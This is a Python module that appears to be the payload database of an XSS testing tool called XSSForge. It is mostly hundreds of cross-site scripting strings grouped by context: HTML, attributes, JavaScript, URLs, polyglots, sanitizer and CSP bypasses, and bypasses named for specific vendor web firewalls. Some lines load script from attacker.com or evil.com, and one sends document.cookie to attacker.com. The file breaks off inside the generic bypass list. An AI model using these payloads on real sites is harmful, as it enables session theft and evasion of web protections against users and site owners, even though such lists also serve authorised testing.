"""
XSSForge Ultimate Payload Database v2.0

The most comprehensive XSS payload collection targeting:
- HTML body context (150+ payloads)
- Attribute contexts (50+ payloads)
- JavaScript contexts (40+ payloads)
- URL/href contexts (20+ payloads)
- Polyglots (30+ payloads)
- mXSS/Sanitizer bypass (30+ payloads)
- CSP bypass (20+ payloads)
- WAF-specific bypasses (50+ payloads)

Total: 500+ unique payloads covering all XSS scenarios.

Payload sources:
- PortSwigger XSS Cheat Sheet
- PayloadBox
- Real-world bug bounty findings
- CVE-specific bypasses
"""

from dataclasses import dataclass
from typing import Iterator


# ============================================================================
# ULTIMATE PAYLOADS - 500+ XSS payloads organized by context
# ============================================================================

ULTIMATE_PAYLOADS: dict[str, list[str]] = {
    # =========================================================================
    # HTML BODY CONTEXT (150+ payloads)
    # =========================================================================
    "html": [
        # --- Basic Script Tags (15) ---
        '<script>alert(1)</script>',
        '<script>alert`1`</script>',
        '<script>alert(document.domain)</script>',
        '<script>alert(document.cookie)</script>',
        '<script src=//attacker.com/x.js></script>',
        '<script/src=//attacker.com/x.js></script>',
        '<script src=data:,alert(1)></script>',
        '<script>eval(atob("YWxlcnQoMSk="))</script>',
        '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
        '<script>Function`a]ert(1)```</script>',
        '<script>[].constructor.constructor("alert(1)")()</script>',
        '<script>window["alert"](1)</script>',
        '<script>self["alert"](1)</script>',
        '<script>top["alert"](1)</script>',
        '<script>this["alert"](1)</script>',

        # --- IMG Tag Variants (25) ---
        '<img src=x onerror=alert(1)>',
        '<img/src=x onerror=alert(1)>',
        '<img src=x onerror="alert(1)">',
        '<img src=x onerror=alert`1`>',
        '<img src onerror=alert(1)>',
        '<img src=1 onerror=alert(1)>',
        '<img src=x:x onerror=alert(1)>',
        '<img src="x`>`<script>alert(1)</script>">',
        '<img/src="x"/onerror="alert(1)">',
        '<img src=x onError="`${alert(1)}`">',
        '<img src=x onerror=alert(1)//>',
        '<img src=x onerror=alert(1) >',
        '<img src=x onerror=alert(1)//comment>',
        '<img ignored=() src=x onerror=alert(1)>',
        '<img src=x onerror="alert(1)"x>',
        '<img/src/onerror=alert(1)>',
        '<img src=x onerror=\u0061lert(1)>',
        '<img src=x onerror=al\\u0065rt(1)>',
        '<img src=x onerror=&#97;lert(1)>',
        '<img src=x onerror=&#x61;lert(1)>',
        '<img src=x onerror=alert&lpar;1&rpar;>',
        '<img src=x onerror=alert&#40;1&#41;>',
        '<img/src=`x`onerror=alert(1)>',
        '<img src=x onerror="javascript:alert(1)">',
        '<img lowsrc=javascript:alert(1)>',

        # --- SVG Variants (35) ---
        '<svg onload=alert(1)>',
        '<svg/onload=alert(1)>',
        '<svg onload=alert`1`>',
        '<svg/onload=alert`1`>',
        '<svg><script>alert(1)</script>',
        '<svg><script>alert(1)</script></svg>',
        '<svg><animate onbegin=alert(1) attributeName=x>',
        '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
        '<svg><set onbegin=alert(1) attributename=x>',
        '<svg><set onbegin=alert(1) attributeName=x to=y>',
        '<svg><circle><set onbegin=alert(1) attributename=fill>',
        '<svg><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" onclick=alert(1)/>',
        '<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>"></foreignObject>',
        '<svg><a><animate attributeName=href values=javascript:alert(1)></a><text x=20 y=20>click</text></svg>',
        '<svg><a xlink:href="javascript:alert(1)"><text x=20 y=20>XSS</text></a></svg>',
        '<svg><use href="data:image/svg+xml,<svg id=x xmlns=%22http://www.w3.org/2000/svg%22><script>alert(1)</script></svg>#x">',
        '<svg><image href="x" onerror=alert(1)>',
        '<svg><image xlink:href="x" onerror=alert(1)>',
        '<svg><discard onbegin=alert(1)>',
        '<svg><desc><img src=x onerror=alert(1)></desc></svg>',
        '<svg/onload="alert(1)">',
        '<svg onload=alert`1` >',
        '<svg on onload=alert(1)>',
        '<svg onx=() onload=alert(1)>',
        '<svg/on onload=alert(1)>',
        '<svg/onload=alert(1)//\'>',
        '<svg id=x onfocusin=alert(1)><use href=#x tabindex=1>',
        '<svg><animate href=#x attributeName=href values="javascript:alert(1)" /><a id=x><text x=20 y=20>Click</text></a>',
        '<svg contentScriptType=text/vbs><script>MsgBox+1</script>',
        '<svg><script xlink:href=data:,alert(1)></script>',
        '<svg><script href=data:,alert(1)></script>',
        '<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?"><circle r="400"></circle><animate attributeName="xlink:href" begin="0" from="javascript:alert(1)" to="&" /></a></svg>',
        '<svg><feImage href="javascript:alert(1)"/>',
        '<svg><animate xlink:href=#x attributeName=href from=javascript:alert(1) to=1 />',
        '<svg><tref xlink:href="data:text/html,<script>alert(1)</script>">',

        # --- Event Handlers - Auto-trigger (50+) ---
        '<body onload=alert(1)>',
        '<body onpageshow=alert(1)>',
        '<body onresize=alert(1)>',
        '<body onfocus=alert(1)>',
        '<body onhashchange=alert(1)>',
        '<body onpagereveal=alert(1)>',
        '<body onscroll=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<input onblur=alert(1) autofocus><input autofocus>',
        '<input onfocusin=alert(1) autofocus>',
        '<input onfocusout=alert(1) autofocus><input autofocus>',
        '<select autofocus onfocus=alert(1)>',
        '<textarea autofocus onfocus=alert(1)>',
        '<keygen autofocus onfocus=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<details/open/ontoggle=alert(1)>',
        '<details open ontoggle=alert(1)><summary>X</summary>',
        '<marquee onstart=alert(1)>',
        '<marquee loop=1 width=0 onfinish=alert(1)>',
        '<marquee onscroll=alert(1)>',
        '<video src=x onerror=alert(1)>',
        '<video><source onerror=alert(1)>',
        '<video onloadstart=alert(1)><source>',
        '<video onloadeddata=alert(1) autoplay><source src=x>',
        '<video onloadedmetadata=alert(1) autoplay><source src=x>',
        '<video oncanplay=alert(1) autoplay><source src=x>',
        '<audio src=x onerror=alert(1)>',
        '<audio onloadstart=alert(1)><source>',
        '<object data="javascript:alert(1)">',
        '<object data=x onerror=alert(1)>',
        '<embed src="javascript:alert(1)">',
        '<embed src=x onerror=alert(1)>',
        '<iframe onload=alert(1)>',
        '<iframe srcdoc="<script>alert(1)</script>">',
        '<iframe src="javascript:alert(1)">',
        '<iframe src="data:text/html,<script>alert(1)</script>">',
        '<math><a xlink:href="javascript:alert(1)">click</a></math>',
        '<form><button formaction=javascript:alert(1)>X</button></form>',
        '<form action="javascript:alert(1)"><input type=submit>',
        '<form><input type=submit formaction="javascript:alert(1)">',
        '<isindex action=javascript:alert(1) type=submit>',
        '<link rel=import href="data:text/html,<script>alert(1)</script>">',
        '<base href="javascript:alert(1)//">',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        '<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">',
        '<bgsound src="javascript:alert(1)">',
        '<table background="javascript:alert(1)">',
        '<table><td background="javascript:alert(1)">',

        # --- Animation Events (10) ---
        '<style>@keyframes x{}</style><b style="animation:x" onanimationstart=alert(1)>',
        '<style>@keyframes x{}</style><b style="animation:x" onanimationend=alert(1)>',
        '<style>@keyframes x{}</style><b style="animation:x" onanimationiteration=alert(1)>',
        '<b style="transition:1s" ontransitionend=alert(1)>',
        '<b style="transition:1s" ontransitionstart=alert(1)>',
        '<b style="transition:1s" ontransitionrun=alert(1)>',
        '<b style="transition:1s" ontransitioncancel=alert(1)>',
        '<style>@keyframes x{}</style><div style=animation-name:x onanimationstart=alert(1)>',
        '<div style="animation:x 1s" onanimationstart=alert(1)></div>',
        '<style>@keyframes x{from{left:0}to{left:100px}}</style><div style=animation:x onanimationend=alert(1)></div>',

        # --- Scroll Events (5) ---
        '<div style="height:1000px"></div><div onscrollend=alert(1) style="overflow:scroll;height:100px">',
        '<div contenteditable onscrollsnapchange=alert(1)>',
        '<div onscroll=alert(1) style="overflow:scroll;height:100px"><div style="height:1000px">',
        '<body onscroll=alert(1)><br><br>...<br><div style="height:1000px">',
        '<marquee behavior=alternate onscroll=alert(1)>',

        # --- Pointer Events (5) ---
        '<a onpointerenter=alert(1)>hover</a>',
        '<a onpointerdown=alert(1)>click</a>',
        '<a onpointerup=alert(1)>click</a>',
        '<a onauxclick=alert(1)>right-click</a>',
        '<a onpointerover=alert(1)>hover</a>',

        # --- Focus/Visibility Events (5) ---
        '<div oncontentvisibilityautostatechange=alert(1) style="content-visibility:auto">',
        '<xss onfocus=alert(1) autofocus tabindex=1>',
        '<x onfocus=alert(1) tabindex=1 id=x>#x',
        '<input onfocusin=alert(1) autofocus>',
        '<div onfocusout=alert(1) tabindex=1 id=x autofocus><input autofocus>',

        # --- Rare/Exotic Events (10) ---
        '<xss id=x onsecuritypolicyviolation=alert(1)><script>crypto.randomUUID()</script>',
        '<div onbeforematch=alert(1) hidden=until-found>',
        '<form onformdata=alert(1)><button>X</button></form>',
        '<div contenteditable onbeforeinput=alert(1)>',
        '<img src=valid.jpg onload=alert(1)>',
        '<input type=file onchange=alert(1)>',
        '<input type=image src=x onerror=alert(1)>',
        '<portal src="https://example.com" onmessageerror=alert(1)>',
        '<video onencrypted=alert(1)><source src=x>',
        '<video onwaiting=alert(1) autoplay><source src=x>',

        # --- Additional HTML payloads (50+) ---
        '<fieldset onfocus=alert(1) autofocus>',
        '<object type="text/html" data="javascript:alert(1)">',
        '<script async src="data:text/javascript,alert(1)">',
        '<script defer src="data:text/javascript,alert(1)">',
        '<link rel="stylesheet" href="data:text/css,*{x:expression(alert(1))}">',
        '<link rel="preload" as="script" href="javascript:alert(1)">',
        '<svg><path onload=alert(1)>',
        '<svg><rect onload=alert(1)>',
        '<svg><polygon onload=alert(1)>',
        '<svg><ellipse onload=alert(1)>',
        '<svg><g onload=alert(1)>',
        '<svg><defs><script>alert(1)</script></defs>',
        '<svg><symbol id=x><script>alert(1)</script></symbol><use href=#x>',
        '<math><semantics><annotation-xml encoding="application/xhtml+xml"><script>alert(1)</script></annotation-xml></semantics></math>',
        '<math><mi xlink:href="javascript:alert(1)">click</mi></math>',
        '<button popovertarget=x onclick=alert(1)>X</button><div popover id=x>',
        '<dialog onclose=alert(1)><button onclick=this.parentElement.close()>X</button>',
        '<meter value=2 min=0 max=10 onchange=alert(1)>',
        '<progress value=70 max=100 onchange=alert(1)>',
        '<output oninput=alert(1)>',
        '<canvas oncontextmenu=alert(1)>',
        '<figure onfocus=alert(1) tabindex=1>',
        '<figcaption onfocus=alert(1) tabindex=1>',
        '<article onfocus=alert(1) tabindex=1>',
        '<aside onfocus=alert(1) tabindex=1>',
        '<footer onfocus=alert(1) tabindex=1>',
        '<header onfocus=alert(1) tabindex=1>',
        '<main onfocus=alert(1) tabindex=1>',
        '<nav onfocus=alert(1) tabindex=1>',
        '<section onfocus=alert(1) tabindex=1>',
        '<summary onclick=alert(1)>click',
        '<slot onfocus=alert(1) tabindex=1>',
        '<template shadowrootmode=open><script>alert(1)</script></template>',
        '<img loading=lazy src=x onerror=alert(1)>',
        '<img decoding=async src=x onerror=alert(1)>',
        '<img referrerpolicy=no-referrer src=x onerror=alert(1)>',
        '<video playsinline src=x onerror=alert(1)>',
        '<video muted autoplay src=x onerror=alert(1)>',
        '<video loop src=x onerror=alert(1)>',
        '<audio autoplay src=x onerror=alert(1)>',
        '<audio muted src=x onerror=alert(1)>',
        '<track default src=x onerror=alert(1)>',
        '<source media="(min-width:0)" srcset=x onerror=alert(1)>',
        '<picture><source srcset=x onerror=alert(1)><img></picture>',
        '<svg preserveAspectRatio=x onload=alert(1)>',
        '<svg viewBox="0 0 0 0" onload=alert(1)>',
        '<math display=block onload=alert(1)>',
        '<ruby onload=alert(1)><rt>',
        '<bdi onfocus=alert(1) tabindex=1>',
        '<bdo onfocus=alert(1) tabindex=1>',
        '<wbr onfocus=alert(1) tabindex=1>',
        '<data onfocus=alert(1) tabindex=1>',
        '<time onfocus=alert(1) tabindex=1>',
        '<var onfocus=alert(1) tabindex=1>',
        '<samp onfocus=alert(1) tabindex=1>',
        '<kbd onfocus=alert(1) tabindex=1>',
        '<sub onfocus=alert(1) tabindex=1>',
        '<sup onfocus=alert(1) tabindex=1>',
    ],

    # =========================================================================
    # ATTRIBUTE CONTEXT - Double Quote (25 payloads)
    # =========================================================================
    "attr_double": [
        '"><script>alert(1)</script>',
        '"><script>alert(1)</script><x x="',
        '"><img src=x onerror=alert(1)>',
        '"><img src=x onerror=alert(1)><x x="',
        '" onmouseover="alert(1)"',
        '" onfocus="alert(1)" autofocus="',
        '" onclick="alert(1)"',
        '"><svg onload=alert(1)>',
        '"><svg/onload=alert(1)>',
        '" style="animation:x" onanimationstart="alert(1)"',
        '" onpointerenter="alert(1)"',
        '"><details open ontoggle=alert(1)>',
        '" accesskey="x" onclick="alert(1)"',
        '"><input onfocus=alert(1) autofocus>',
        '" onmouseenter="alert(1)"',
        '" onbeforeinput="alert(1)"',
        '"><marquee onstart=alert(1)>',
        '" onfocusin="alert(1)" autofocus="',
        '"><video src=x onerror=alert(1)>',
        '"><audio src=x onerror=alert(1)>',
        '" onkeydown="alert(1)"',
        '" onkeyup="alert(1)"',
        '" onkeypress="alert(1)"',
        '"><body onload=alert(1)>',
        '"/><svg onload=alert(1)>',
    ],

    # =========================================================================
    # ATTRIBUTE CONTEXT - Single Quote (20 payloads)
    # =========================================================================
    "attr_single": [
        "'><script>alert(1)</script>",
        "'><script>alert(1)</script><x x='",
        "'><img src=x onerror=alert(1)>",
        "'><img src=x onerror=alert(1)><x x='",
        "' onmouseover='alert(1)'",
        "' onfocus='alert(1)' autofocus='",
        "' onclick='alert(1)'",
        "'><svg onload=alert(1)>",
        "'><svg/onload=alert(1)>",
        "' style='animation:x' onanimationstart='alert(1)'",
        "'><details open ontoggle=alert(1)>",
        "' accesskey='x' onclick='alert(1)'",
        "'><input onfocus=alert(1) autofocus>",
        "' onmouseenter='alert(1)'",
        "'><marquee onstart=alert(1)>",
        "'><video src=x onerror=alert(1)>",
        "'><audio src=x onerror=alert(1)>",
        "' onkeydown='alert(1)'",
        "' onfocusin='alert(1)' autofocus='",
        "'/><svg onload=alert(1)>",
    ],

    # =========================================================================
    # ATTRIBUTE CONTEXT - Unquoted (15 payloads)
    # =========================================================================
    "attr_unquoted": [
        " onmouseover=alert(1) ",
        " onfocus=alert(1) autofocus ",
        " onclick=alert(1) ",
        " onload=alert(1) ",
        "><img src=x onerror=alert(1)>",
        "><svg onload=alert(1)>",
        "><script>alert(1)</script>",
        " autofocus onfocus=alert(1) ",
        " onmouseenter=alert(1) ",
        "><details open ontoggle=alert(1)>",
        "><input onfocus=alert(1) autofocus>",
        " onpointerenter=alert(1) ",
        "><marquee onstart=alert(1)>",
        " onanimationstart=alert(1) style=animation:x ",
        "><body onload=alert(1)>",
    ],

    # =========================================================================
    # JAVASCRIPT CONTEXT - Double Quote String (20 payloads)
    # =========================================================================
    "js_double": [
        '";alert(1)//',
        '";alert(1);"',
        '"-alert(1)-"',
        '";</script><script>alert(1)</script>',
        '"};alert(1)//',
        '"+alert(1)+"',
        '"*alert(1)*"',
        '"||alert(1)||"',
        '"&&alert(1)&&"',
        '";alert`1`//',
        '"]);alert(1);//',
        '"}];alert(1);//',
        '"});alert(1);//',
        '"-alert(1)//',
        '";[].constructor.constructor("alert(1)")()//',
        '";eval("alert(1)")//',
        '";eval(atob("YWxlcnQoMSk="))//',
        '";window["alert"](1)//',
        '";self["alert"](1)//',
        '";top["alert"](1)//',
    ],

    # =========================================================================
    # JAVASCRIPT CONTEXT - Single Quote String (20 payloads)
    # =========================================================================
    "js_single": [
        "';alert(1)//",
        "';alert(1);'",
        "'-alert(1)-'",
        "';</script><script>alert(1)</script>",
        "'};alert(1)//",
        "'+alert(1)+'",
        "'||alert(1)||'",
        "'&&alert(1)&&'",
        "';alert`1`//",
        "']);alert(1);//",
        "']}];alert(1);//",
        "'});alert(1);//",
        "'-alert(1)//",
        "';[].constructor.constructor('alert(1)')()//",
        "';eval('alert(1)')//",
        "';eval(atob('YWxlcnQoMSk='))//",
        "';window['alert'](1)//",
        "';self['alert'](1)//",
        "';top['alert'](1)//",
        "\\';alert(1)//",
        # Event handler breakouts (e.g., onload="func('INPUT')")
        "');alert(1);//",
        "');alert(1);('",
        "');alert`1`;//",
        "')%3Balert(1)%3B//",
        "1');alert(1);//",
        "1');alert('1",
        "1');alert(document.domain);//",
        "');confirm(1);//",
        "');prompt(1);//",
        "1'%2balert(1)%2b'",
    ],

    # =========================================================================
    # JAVASCRIPT CONTEXT - Template Literal (15 payloads)
    # =========================================================================
    "js_template": [
        '${alert(1)}',
        '`${alert(1)}`',
        '${`${alert(1)}`}',
        '${constructor.constructor("alert(1)")()}',
        '${window["alert"](1)}',
        '${self["alert"](1)}',
        '${[].constructor.constructor("alert(1)")()}',
        '${eval("alert(1)")}',
        '${eval(atob("YWxlcnQoMSk="))}',
        '`-alert(1)-`',
        '`+alert(1)+`',
        '${this["alert"](1)}',
        '${top["alert"](1)}',
        '${Function("alert(1)")()}',
        '${setTimeout("alert(1)")}',
    ],

    # =========================================================================
    # JAVASCRIPT CONTEXT - Code Injection (15 payloads)
    # =========================================================================
    "js_code": [
        "alert(1)",
        "alert`1`",
        "prompt(1)",
        "confirm(1)",
        "(alert)(1)",
        "eval('alert(1)')",
        "setTimeout('alert(1)')",
        "setInterval('alert(1)',1000)",
        "Function('alert(1)')()",
        "[].constructor.constructor('alert(1)')()",
        "window['alert'](1)",
        "this['alert'](1)",
        "self['alert'](1)",
        "top['alert'](1)",
        "new Function('alert(1)')()",
    ],

    # =========================================================================
    # URL/HREF CONTEXT (25 payloads)
    # =========================================================================
    "url": [
        'javascript:alert(1)',
        'javascript:alert`1`',
        'javascript:/**/alert(1)',
        'javascript://%0aalert(1)',
        'javascript://%0dalert(1)',
        '  javascript:alert(1)',
        'javascript\n:alert(1)',
        'javascript\t:alert(1)',
        'javascript\r:alert(1)',
        'jaVasCript:alert(1)',
        'JaVaScRiPt:alert(1)',
        'javascript&colon;alert(1)',
        '&#x6A;avascript:alert(1)',
        '&#106;avascript:alert(1)',
        'java&#115;cript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'javascript:eval(atob("YWxlcnQoMSk="))',
        'javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))',
        'javascript:window["alert"](1)',
        'javascript:[].constructor.constructor("alert(1)")()',
        'vbscript:msgbox(1)',
        'data:text/html;charset=utf-8,<script>alert(1)</script>',
        'javascript:void(alert(1))',
        'javascript:/*--></title></style></textarea></script><svg/onload=alert(1)//-->',
    ],

    # =========================================================================
    # POLYGLOTS (35 payloads)
    # =========================================================================
    "polyglot": [
        "'\"><img src=x onerror=alert(1)>",
        "javascript:/*--></title></style></textarea></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "'\">><marquee><img src=x onerror=alert(1)></marquee></textarea></title></style></script>",
        "--></script><script>alert(1)</script>",
        "*/alert(1)/*",
        "*/</script><script>alert(1)</script>/*",
        "'-alert(1)-'",
        '"-alert(1)-"',
        "</ScRiPt><sCrIpT>alert(1)</ScRiPt>",
        "<img src=x onerror=alert`1`>",
        "<svg/onload=alert`1`>",
        "{{constructor.constructor('alert(1)')()}}",
        "${alert(1)}",
        "#{alert(1)}",
        "{{7*7}}",
        "<%= 7*7 %>",
        "{{config}}",
        "${7*7}",
        "[[${7*7}]]",
        "'\"-->]]>*/</script></style></title></textarea></noscript></xmp></template><img src=x onerror=alert(1)>",
        "<script>alert(1)</script>",
        "'\"--></style></script><svg onload=alert(1)>",
        "'\"><script>alert(1)</script>",
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/alert(1)//",
        "<img/src=x onerror='alert(1)'>",
        "<svg/onload='alert(1)'>",
        '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
        '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
        "</title><script>alert(1)</script>",
        "</textarea><script>alert(1)</script>",
        "</style><script>alert(1)</script>",
        "<!--><img src=x onerror=alert(1)>-->",
        "*/</script><!-- --><script>alert(1)</script>",
        '"><img src onerror=alert(1)><"',
        "<video><source onerror=alert(1)>",
    ],

    # =========================================================================
    # mXSS / SANITIZER BYPASS (35 payloads)
    # =========================================================================
    "mxss": [
        '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
        '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
        '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>',
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        '<svg><style>{font-family:\'<img/src=x onerror=alert(1)>',
        '<a href="\\1javascript:alert(1)">click</a>',
        '<div id="1"><form id="test"></form><a href="javascript:alert(1)">click</a></div>',
        '<math><mi><img src=x onerror=alert(1)></mi></math>',
        '<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>',
        '<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>',
        '<svg><desc><img src=x onerror=alert(1)></desc></svg>',
        '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
        '<template><img src=x onerror=alert(1)></template>',
        '<xmp><img src=x onerror=alert(1)></xmp>',
        '<listing><img src=x onerror=alert(1)></listing>',
        '<select><img src=x onerror=alert(1)></select>',
        '<table><img src=x onerror=alert(1)></table>',
        '<noembed><img src=x onerror=alert(1)></noembed>',
        '<noframes><img src=x onerror=alert(1)></noframes>',
        '<frameset><img src=x onerror=alert(1)></frameset>',
        '<img src=x onerror=alert(1)//>',
        '<<script>script>alert(1)</script>',
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<scr\\x00ipt>alert(1)</script>',
        '<script\\n>alert(1)</script>',
        '<img\\tsrc=x\\tonerror=alert(1)>',
        '<ScRiPt>alert(1)</ScRiPt>',
        '<IMG SRC=x ONERROR=alert(1)>',
        '<!--><img src=x onerror=alert(1)>-->',
        '<![CDATA[><img src=x onerror=alert(1)>]]>',
        '+ADw-script+AD4-alert(1)+ADw-/script+AD4-',
        '<p id="><img src=x onerror=alert(1)><"></p>',
        '<x-]="x"><img src=x onerror=alert(1)>',
        '<svg><handler on:event="alert(1)">',
        '<svg><set onbegin=alert(1)></svg>',
    ],

    # =========================================================================
    # CSP BYPASS (25 payloads)
    # =========================================================================
    "csp_bypass": [
        '<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script><div ng-app ng-csp>{{$eval.constructor(\'alert(1)\')()}}</div>',
        '<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js"></script><div ng-app ng-csp id="p">{{$on.curry.call().alert(1)}}</div>',
        '<script src="https://www.google.com/jsapi?callback=alert"></script>',
        '<script src="https://accounts.google.com/o/oauth2/postmessageRelay?callback=alert"></script>',
        '<base href="https://attacker.com/"><script src="/xss.js"></script>',
        '<link rel="prefetch" href="//attacker.com">',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        '<object data="data:text/html,<script>alert(1)</script>">',
        '<embed src="data:text/html,<script>alert(1)</script>">',
        '<iframe srcdoc="<script>alert(1)</script>">',
        '<script nonce="">alert(1)</script>',
        '<script src="https://ajax.googleapis.com/ajax/services/feed/find?v=1.0&callback=alert&context=1"></script>',
        '<img src=x onerror="fetch(`//attacker.com?c=${document.cookie}`)">',
        "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/dojo/1.14.1/dojo.js\" data-dojo-config=\"has:{'extend-esm':1}\" />",
        '<script src="https://www.googleadservices.com/pagead/conversion.js?&callback=alert"></script>',
        '<link rel=stylesheet href="data:text/css,{}*{x:expression(alert(1))}">',
        '<style>@import url("data:text/css,*{x:expression(alert(1))}");</style>',
        '<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><script>alert(1)</script></svg>#x">',
        '<script src="/api/jsonp?callback=alert"></script>',
        '<script src="//evil.com/xss.js"></script>',
        '<form action="https://attacker.com"><input name=x><input type=submit>',
        '<a href="https://attacker.com" download>click</a>',
        '<meta http-equiv="Content-Security-Policy" content="">',
        '<script>import("data:text/javascript,alert(1)")</script>',
        '<script>eval(location.hash.slice(1))</script>#alert(1)',
    ],

    # =========================================================================
    # WAF BYPASS - Cloudflare Specific (35+ payloads)
    # Updated with 2024/2025 bypasses
    # =========================================================================
    "waf_cloudflare": [
        # Classic bypasses
        '<dETAILS open onToGgle=alert(1)>',
        '<sVg OnPointerEnter=alert(1)>',
        '<img ignored=() src=x onerror=alert(1)>',
        '<svg on onload=alert(1)>',
        '<svg onx=() onload=alert(1)>',
        '<svg/on onload=alert(1)>',
        '<svg/onload=alert(1)//>',
        '<<script>alert(1)//<</script>',
        '<</script><script>alert(1)</script>',
        '<script>\\u0061lert(1)</script>',
        '<img src=x onerror=\\u0061lert(1)>',
        '<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>',
        '<details/open/ontoggle=self[`alert`](1)>',
        '<img src=x onerror=window[`alert`](1)>',
        '<svg onload=[].constructor.constructor(`alert(1)`)()>',
        # 2024/2025 Advanced bypasses
        '<svg%0Aonload=alert(1)>',  # Newline bypass
        '<svg%0Donload=alert(1)>',  # Carriage return bypass
        '<svg%09onload=alert(1)>',  # Tab bypass
        '<svg%0Conload=alert(1)>',  # Form feed bypass
        '<img src=x o]nerror=alert(1)>',  # Bracket injection
        '<svg onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>',  # Hex entities
        '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)//></style>',  # mXSS mutation
        '<svg><discard onbegin=alert(1)>',  # Rare SVG event
        '<input type=image src=x onerror=alert(1)>',  # Input image
        '<video><source onerror=alert(1)>',  # Video source error
        '<audio src=x onerror=alert(1)>',  # Audio tag
        '<body onpageshow=alert(1)>',  # Page show event
        '<marquee behavior=alternate onbounce=alert(1)>test',  # Marquee bounce
        '<svg><a><animate attributeName=href values=javascript:alert(1) /></a><text x=20 y=20>CLICK</text></svg>',  # SVG animate
        '<svg><use href=data:image/svg+xml;base64,PHN2ZyBpZD0iYSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+#a>',  # SVG use data URI
        '"><img src=x id=confirm(1) onerror=eval(id)>',  # ID eval trick
        '<style>@keyframes x{}</style><div style=animation-name:x onanimationend=alert(1)>',  # Animation event
        '<img src=x onerror=alert?.()>',  # Optional chaining (modern JS)
        '<img src=x onerror=(alert)(1)>',  # Parenthesis wrapper
        '<img src=x onerror=alert?.(1)>',  # Optional chaining with args
    ],

    # =========================================================================
    # WAF BYPASS - Akamai Specific (10 payloads)
    # =========================================================================
    "waf_akamai": [
        '<svg><circle><set onbegin=alert(1) attributename=fill>',
        '<marquee loop=1 width=0 onfinish=alert(1)>',
        '<svg onload=&#97;lert(1)>',
        '<img src=x onerror=\\u0061lert(1)>',
        '<details open ontoggle=al\\u0065rt(1)>',
        '<svg onload=al\\x65rt(1)>',
        '<img src=x onerror="al"+"ert"(1)>',
        '<img src=x onerror=eval(atob(`YWxlcnQoMSk=`))>',
        '<svg/onload=top[/al/.source+/ert/.source](1)>',
        '<img src=x onerror=window[String.fromCharCode(97,108,101,114,116)](1)>',
    ],

    # =========================================================================
    # WAF BYPASS - ModSecurity Specific (10 payloads)
    # =========================================================================
    "waf_modsecurity": [
        '<svg/onload="+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//">',
        '<img src=x onerror =alert(1)>',
        r'<script>al/**/ert(1)</script>',
        '<img src=x onerror/**/=/**/alert(1)>',
        '<svg onload=alert(1)//>;',
        '<script>eval(atob`YWxlcnQoMSk=`)</script>',
        '<img src=x onerror=`${alert(1)}`>',
        '<svg><script>al&#101;rt(1)</script>',
        '<img src=x onerror=alert(1) IGNORE_ME>',
        '<details open ontoggle=eval(`\\x61lert(1)`)>',
    ],

    # =========================================================================
    # WAF BYPASS - AWS WAF Specific (10 payloads)
    # =========================================================================
    "waf_aws": [
        '<img src=x onerror=\\x61lert(1)>',
        '<svg onload=\\x61\\x6c\\x65\\x72\\x74(1)>',
        '<script>\\x61lert(1)</script>',
        '<img src=x onerror=al\\u0065rt(1)>',
        '<details open ontoggle=&#x61;lert(1)>',
        '<svg onload=top[`al`+`ert`](1)>',
        '<img src=x onerror=window[`\\x61lert`](1)>',
        '<svg><script>\\141\\154\\145\\162\\164(1)</script>',
        '<img src=x onerror=Function(`al`+`ert(1)`)()>',
        '<svg onload=setTimeout`alert\\x281\\x29`>',
    ],

    # =========================================================================
    # WAF BYPASS - Imperva Specific (10 payloads)
    # =========================================================================
    "waf_imperva": [
        '<svg onload=alert&lpar;1&rpar;>',
        '<img src=x onerror=al\\u0065rt(1)>',
        '<img src=x onerror=alert&#40;1&#41;>',
        '<svg onload=alert&#x28;1&#x29;>',
        '<details open ontoggle=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>',
        '<img src=x onerror=`${alert(1)}`>',
        '<svg onload=window[`alert`]`1`>',
        '<img src=x onerror=[]["constructor"]["constructor"]("alert(1)")()>',
        '<svg onload=Reflect.apply(alert,null,[1])>',
        '<img src=x onerror=self[/alert/.source](1)>',
    ],

    # =========================================================================
    # WAF BYPASS - Generic (15 payloads)
    # =========================================================================
    "waf_generic": [
        '<img src=x onerror=alert`1`>',
        '<svg/onload=alert`1`>',
        '<details/open/ontoggle=alert`1`>',
        '<img src=x onerror=top[`alert`](1)>',
        '<svg onload=self[`alert`](1)>',
